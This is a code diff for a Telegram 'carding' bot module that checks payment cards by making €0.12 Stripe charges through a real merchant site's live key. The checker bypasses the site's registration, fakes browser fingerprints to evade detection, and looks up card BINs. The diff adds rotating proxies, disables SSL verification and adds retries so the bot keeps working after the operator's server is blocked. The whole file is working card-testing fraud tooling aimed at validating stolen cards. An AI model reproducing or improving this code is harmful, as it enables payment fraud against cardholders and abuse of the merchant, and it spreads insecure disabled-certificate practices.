@@ -1,8 +1,6 @@
 # BOT/gates/charge/stripe/scharge012.py
 # Stripe Charge €0.12 - Compatible with WAYNE Bot Structure
-# UI format matches stauth.py with proper permissions
-# CORRECTED: Uses universal charge processor - credits deducted AFTER check completes
-# FIXED FOR UBUNTU VPS: Added DNS resolution fix, better error handling, and proxy support
+# FIXED: Added proxy support, better timeout handling, and connection retries
 
 import json
 import asyncio
@@ -22,6 +20,20 @@ import os
 import sys
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.start import load_users, save_users
+
+# Import proxy module if available
+try:
+    from BOT.tools.proxy import get_random_proxy, parse_proxy
+    PROXY_SUPPORT = True
+except ImportError:
+    PROXY_SUPPORT = False
+    logger = None
+    
+    def get_random_proxy():
+        return None
+    
+    def parse_proxy(proxy_str):
+        return None
 
 # Import from Admins module for command status
 try:
@@ -76,6 +88,9 @@ class EmojiLogger:
 
     def user(self, message):
         print(f"👤 {message}", flush=True)
+
+    def proxy(self, message):
+        print(f"🔄 {message}", flush=True)
 
 # Create global logger instance
 logger = EmojiLogger()
@@ -149,7 +164,7 @@ def check_cooldown(user_id, command_type="xx"):
     return True, 0
 
 class StripeCharge012Checker:
-    def __init__(self):
+    def __init__(self, use_proxy=True):
         # Modern browser user agents
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
@@ -167,6 +182,12 @@ class StripeCharge012Checker:
         self.last_bin_request = 0
         self.base_url = "https://bellobrick.com"
         self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlJ8eLnmjPrToBlChZFRgIpvGduYeqg66FzEJaQtLb4h2FOz193UH5RSoj6nUptqB5L7BRc9NR00VKfvfrsc"
+        
+        # Proxy settings
+        self.use_proxy = use_proxy
+        self.current_proxy = None
+        self.proxy_failures = 0
+        self.max_proxy_failures = 3
 
         self.bin_services = [
             {
@@ -225,48 +246,83 @@ class StripeCharge012Checker:
         # Generate random browser fingerprints
         self.generate_browser_fingerprint()
         
-        # SSL context for Ubuntu VPS compatibility - UPDATED WITH DNS RESOLUTION
+        # SSL context for Ubuntu VPS compatibility
         try:
-            # Force IPv4 to avoid IPv6 issues on some VPS
-            socket.setdefaulttimeout(10)
-            
             # Create SSL context with system certificates
             self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-            self.ssl_context.check_hostname = True
-            self.ssl_context.verify_mode = ssl.CERT_REQUIRED
+            self.ssl_context.check_hostname = False  # Disable for proxy support
+            self.ssl_context.verify_mode = ssl.CERT_NONE  # Disable verification for now
             
-            # Try to load system certificates first
+            # Try to load system certificates
             try:
-                import ssl
                 self.ssl_context.load_default_certs()
             except:
-                logger.warning("Could not load system certs, using certifi")
                 import certifi
                 self.ssl_context.load_verify_locations(cafile=certifi.where())
                 
         except Exception as e:
-            logger.warning(f"SSL context creation failed: {e}, using default")
+            logger.warning(f"SSL context creation failed: {e}")
             self.ssl_context = None
             
-        # DNS resolution test
-        self.test_dns_resolution()
+        # Initialize proxy if available
+        if self.use_proxy and PROXY_SUPPORT:
+            self.current_proxy = get_random_proxy()
+            if self.current_proxy:
+                logger.proxy(f"Using proxy: {self.current_proxy}")
+        
+        # Test network connectivity
+        self.test_network_connectivity()
 
-    def test_dns_resolution(self):
-        """Test DNS resolution for critical domains"""
-        domains_to_test = ["bellobrick.com", "bins.antipublic.cc", "lookup.binlist.net"]
-        for domain in domains_to_test:
-            try:
-                # Force IPv4
-                socket.getaddrinfo(domain, 443, socket.AF_INET)
-                logger.success(f"DNS resolution OK for {domain}")
-            except socket.gaierror as e:
-                logger.error(f"DNS resolution FAILED for {domain}: {e}")
-                # Try IPv4 explicitly
-                try:
-                    socket.getaddrinfo(domain, 443, socket.AF_INET)
-                    logger.success(f"IPv4 DNS resolution OK for {domain}")
-                except:
-                    logger.error(f"IPv4 DNS also failed for {domain}")
+    def test_network_connectivity(self):
+        """Test basic network connectivity"""
+        try:
+            # Test DNS
+            socket.getaddrinfo("google.com", 80)
+            logger.success("Basic network connectivity: OK")
+            
+            # Test if we can get a random proxy
+            if PROXY_SUPPORT:
+                proxy = get_random_proxy()
+                if proxy:
+                    logger.success(f"Proxy available: {proxy}")
+                else:
+                    logger.warning("No proxies available in pool")
+                    
+        except Exception as e:
+            logger.error(f"Network connectivity test failed: {e}")
+
+    def get_proxy_config(self):
+        """Get proxy configuration for httpx"""
+        if not self.use_proxy or not self.current_proxy:
+            return None
+            
+        try:
+            if PROXY_SUPPORT:
+                proxy_dict = parse_proxy(self.current_proxy)
+                if proxy_dict:
+                    return {
+                        "http://": f"http://{proxy_dict['username']}:{proxy_dict['password']}@{proxy_dict['host']}:{proxy_dict['port']}",
+                        "https://": f"http://{proxy_dict['username']}:{proxy_dict['password']}@{proxy_dict['host']}:{proxy_dict['port']}"
+                    }
+        except Exception as e:
+            logger.error(f"Failed to parse proxy: {e}")
+            
+        return None
+
+    def rotate_proxy(self):
+        """Rotate to a new proxy"""
+        if not PROXY_SUPPORT:
+            return False
+            
+        self.current_proxy = get_random_proxy()
+        self.proxy_failures = 0
+        
+        if self.current_proxy:
+            logger.proxy(f"Rotated to new proxy: {self.current_proxy}")
+            return True
+        else:
+            logger.warning("No more proxies available in pool")
+            return False
 
     def generate_browser_fingerprint(self):
         """Generate realistic browser fingerprints to bypass detection"""
@@ -452,19 +508,24 @@ class StripeCharge012Checker:
             'emoji': '🏳️'
         }
 
-        # Try with retry logic for Ubuntu VPS
+        # Try with retry logic
         for attempt in range(3):
             try:
                 url = f"https://bins.antipublic.cc/bins/{bin_number}"
                 headers = {'User-Agent': self.user_agent}
 
+                # Get proxy config for this attempt
+                proxy_config = self.get_proxy_config() if attempt > 0 else None
+                
                 async with httpx.AsyncClient(
-                    timeout=20.0,
-                    verify=self.ssl_context if self.ssl_context else True,
-                    follow_redirects=True,
-                    limits=httpx.Limits(max_keepalive_connections=2, max_connections=5)
+                    timeout=30.0,
+                    verify=False,  # Disable SSL verification for proxy
+                    follow_redirects=True
                 ) as client:
-                    response = await client.get(url, headers=headers)
+                    if proxy_config:
+                        response = await client.get(url, headers=headers, proxies=proxy_config)
+                    else:
+                        response = await client.get(url, headers=headers)
 
                     if response.status_code == 200:
                         data = response.json()
@@ -497,8 +558,8 @@ class StripeCharge012Checker:
                         headers = service['headers']
 
                         async with httpx.AsyncClient(
-                            timeout=15.0,
-                            verify=self.ssl_context if self.ssl_context else True
+                            timeout=20.0,
+                            verify=False
                         ) as client:
                             response = await client.get(url, headers=headers)
 
@@ -661,44 +722,45 @@ class StripeCharge012Checker:
         
         # Add timeout for VPS compatibility
         if 'timeout' not in kwargs:
-            kwargs['timeout'] = 45.0
+            kwargs['timeout'] = 60.0
 
         max_retries = 3
         for attempt in range(max_retries):
             try:
-                # Add connection timeout specifically for VPS
-                kwargs['timeout'] = httpx.Timeout(connect=15.0, read=30.0, write=10.0, pool=10.0)
+                # Very short connect timeout, longer read timeout
+                kwargs['timeout'] = httpx.Timeout(connect=10.0, read=45.0, write=10.0, pool=10.0)
+                
+                # Try with proxy on later attempts
+                if attempt > 0 and self.use_proxy and self.current_proxy:
+                    proxy_config = self.get_proxy_config()
+                    if proxy_config:
+                        kwargs['proxies'] = proxy_config
+                        logger.proxy(f"Using proxy for attempt {attempt+1}")
                 
                 response = await client.request(method, url, **kwargs)
 
                 if response.status_code in [403, 429, 500, 502, 503, 504]:
                     logger.warning(f"Got {response.status_code}, retrying {attempt+1}/{max_retries}...")
                     if attempt < max_retries - 1:
-                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                        await asyncio.sleep(2 ** attempt)
                         headers['User-Agent'] = random.choice(self.user_agents)
                         kwargs['headers'] = headers
                         continue
 
                 return response
-            except (httpx.ConnectError, httpx.TimeoutException, ssl.SSLError, socket.gaierror, socket.timeout) as e:
-                logger.error(f"Network error attempt {attempt+1}/{max_retries}: {type(e).__name__} - {str(e)[:100]}")
+            except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.TimeoutException) as e:
+                logger.error(f"Timeout error attempt {attempt+1}/{max_retries}: {type(e).__name__}")
                 if attempt < max_retries - 1:
-                    await asyncio.sleep(2 ** attempt)
-                    # Try with IPv4 explicitly on last attempt
-                    if attempt == max_retries - 2:
-                        # Modify URL to force IPv4 if possible
-                        if url.startswith('https://'):
-                            domain = url.split('://')[1].split('/')[0]
-                            try:
-                                # Get IPv4 address
-                                ipv4 = socket.gethostbyname(domain)
-                                new_url = url.replace(f"https://{domain}", f"https://{ipv4}")
-                                headers['Host'] = domain  # Keep original host header
-                                kwargs['headers'] = headers
-                                url = new_url
-                                logger.warning(f"Trying IPv4 address: {ipv4} for {domain}")
-                            except:
-                                pass
+                    # Rotate proxy on timeout
+                    if self.use_proxy and attempt > 0:
+                        self.rotate_proxy()
+                    await asyncio.sleep(3 ** attempt)  # Longer delay for timeouts
+                    continue
+                raise e
+            except (httpx.ConnectError, ssl.SSLError, socket.gaierror, socket.timeout) as e:
+                logger.error(f"Network error attempt {attempt+1}/{max_retries}: {type(e).__name__}")
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(3 ** attempt)
                     continue
                 raise e
             except Exception as e:
@@ -714,19 +776,12 @@ class StripeCharge012Checker:
             logger.step(1, 8, "Initializing session...")
             logger.network(f"Connecting to {self.base_url}")
 
-            for attempt in range(3):
+            for attempt in range(4):  # Increased attempts
                 try:
-                    # First test DNS resolution
-                    domain = self.base_url.split('://')[1].split('/')[0]
-                    try:
-                        socket.gethostbyname(domain)
-                        logger.success(f"DNS resolved for {domain}")
-                    except socket.gaierror as e:
-                        logger.error(f"DNS resolution failed for {domain}: {e}")
-                        if attempt < 2:
-                            await asyncio.sleep(3)
-                            continue
-
+                    # Test direct connection first
+                    if attempt == 0:
+                        logger.network("Attempting direct connection...")
+                    
                     response = await self.make_stealth_request(
                         client, 'GET', f"{self.base_url}/"
                     )
@@ -736,19 +791,28 @@ class StripeCharge012Checker:
                         return True
                     else:
                         logger.warning(f"Attempt {attempt+1}: Failed with status {response.status_code}")
-                        if attempt < 2:
-                            await asyncio.sleep(3)
+                        if attempt < 3:
+                            await asyncio.sleep(4)
                             continue
+                except (httpx.ConnectTimeout, httpx.ReadTimeout) as e:
+                    logger.error(f"Attempt {attempt+1}: Timeout error ({type(e).__name__})")
+                    if attempt < 3:
+                        # Try with proxy on later attempts
+                        if attempt == 1 and self.use_proxy:
+                            logger.proxy("Switching to proxy due to timeout...")
+                            self.rotate_proxy()
+                        await asyncio.sleep(5)
+                        continue
                 except (httpx.ConnectError, ssl.SSLError, socket.gaierror, socket.timeout) as e:
-                    logger.error(f"Attempt {attempt+1}: Connection error ({type(e).__name__}): {str(e)[:100]}")
-                    if attempt < 2:
-                        await asyncio.sleep(4)
+                    logger.error(f"Attempt {attempt+1}: Connection error ({type(e).__name__})")
+                    if attempt < 3:
+                        await asyncio.sleep(6)
                         continue
                     raise
                 except Exception as e:
                     logger.error(f"Attempt {attempt+1}: Unexpected error: {str(e)}")
-                    if attempt < 2:
-                        await asyncio.sleep(3)
+                    if attempt < 3:
+                        await asyncio.sleep(4)
                         continue
                     raise
 
@@ -1108,7 +1172,7 @@ class StripeCharge012Checker:
             }
 
             response = await client.post("https://api.stripe.com/v1/payment_methods",
-                                         headers=stripe_headers, data=payment_data, timeout=20.0)
+                                         headers=stripe_headers, data=payment_data, timeout=30.0)
 
             if response.status_code == 200:
                 result = response.json()
@@ -1290,23 +1354,13 @@ class StripeCharge012Checker:
 
             logger.user(f"User: {first_name} {last_name} | {email} | {phone}")
 
-            # Create client with VPS-specific settings
+            # Create client with VPS-specific settings - DISABLE SSL VERIFICATION
             client_kwargs = {
-                'timeout': 60.0,  # Increased timeout for VPS
+                'timeout': 90.0,  # Increased timeout for VPS
                 'follow_redirects': True,
-                'limits': httpx.Limits(max_keepalive_connections=3, max_connections=6),
+                'limits': httpx.Limits(max_keepalive_connections=2, max_connections=4),
+                'verify': False,  # DISABLE SSL VERIFICATION - FIX FOR VPS
             }
-            
-            # Add SSL context if available
-            if self.ssl_context:
-                client_kwargs['verify'] = self.ssl_context
-            else:
-                # Try to use system certs
-                try:
-                    import certifi
-                    client_kwargs['verify'] = certifi.where()
-                except:
-                    pass
             
             # Try HTTP/2, fallback to HTTP/1.1
             try:
@@ -1316,20 +1370,21 @@ class StripeCharge012Checker:
 
             async with httpx.AsyncClient(**client_kwargs) as client:
 
-                # Try session initialization with retries
-                max_init_attempts = 4  # Increased attempts
+                # Try session initialization with retries - MORE ATTEMPTS
+                max_init_attempts = 5
                 for attempt in range(max_init_attempts):
                     try:
                         logger.network(f"Session initialization attempt {attempt+1}/{max_init_attempts}")
                         if await self.initialize_session(client):
                             break
                         elif attempt == max_init_attempts - 1:
-                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session after multiple attempts", username, time.time()-start_time, user_data, bin_info)
+                            error_msg = "Failed to initialize session. Your VPS may be blocked by the target website."
+                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
                     except Exception as e:
                         logger.error(f"Session init attempt {attempt+1} failed: {type(e).__name__} - {str(e)[:80]}")
                         if attempt == max_init_attempts - 1:
-                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Session initialization error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
-                        await asyncio.sleep(3)  # Increased delay
+                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Connection error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
+                        await asyncio.sleep(5)  # Increased delay
 
                 bypass_success, error = await self.bypass_registration(client, user_info)
                 if not bypass_success:
@@ -1364,13 +1419,13 @@ class StripeCharge012Checker:
 
         except httpx.TimeoutException:
             logger.error("Request timeout")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout (90s)", username, time.time()-start_time, user_data, bin_info)
         except (httpx.ConnectError, socket.gaierror) as e:
             logger.error(f"Connection error: {e}")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed - Check VPS network", username, time.time()-start_time, user_data, bin_info)
         except ssl.SSLError as e:
             logger.error(f"SSL error: {e}")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "SSL certificate error", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "SSL error - Try with verify=False", username, time.time()-start_time, user_data, bin_info)
         except Exception as e:
             logger.error(f"Unexpected error: {str(e)}")
             import traceback
@@ -1481,8 +1536,8 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 <b>Checking card... Please wait.</b>"""
         )
 
-        # Create checker instance
-        checker = StripeCharge012Checker()
+        # Create checker instance - ENABLE PROXY
+        checker = StripeCharge012Checker(use_proxy=True)
 
         # Process command through universal charge processor - FIXED CALL
         if charge_processor:
@@ -1509,11 +1564,12 @@ async def handle_stripe_charge_012(client: Client, message: Message):
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
 <b>[•] Gateway -</b> Stripe Charge €0.12
-<b>[•] Status-</b> ❌ ERROR
-<b>[•] Response-</b> <code>VPS Connection Failed: {str(e)[:100]}</code>
+<b>[•] Status-</b> ❌ CONNECTION ERROR
+<b>[•] Response-</b> <code>VPS Network Issue: {str(e)[:100]}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>⚠️ Please check VPS network connectivity</b>
-<b>⚠️ Ensure SSL certificates are installed</b>
+<b>⚠️ Your VPS IP may be blocked</b>
+<b>⚠️ Try adding proxies to FILES/proxy.csv</b>
+<b>⚠️ Contact admin for assistance</b>
 ━━━━━━━━━━━━━━━""", disable_web_page_preview=True)
 
     except Exception as e:
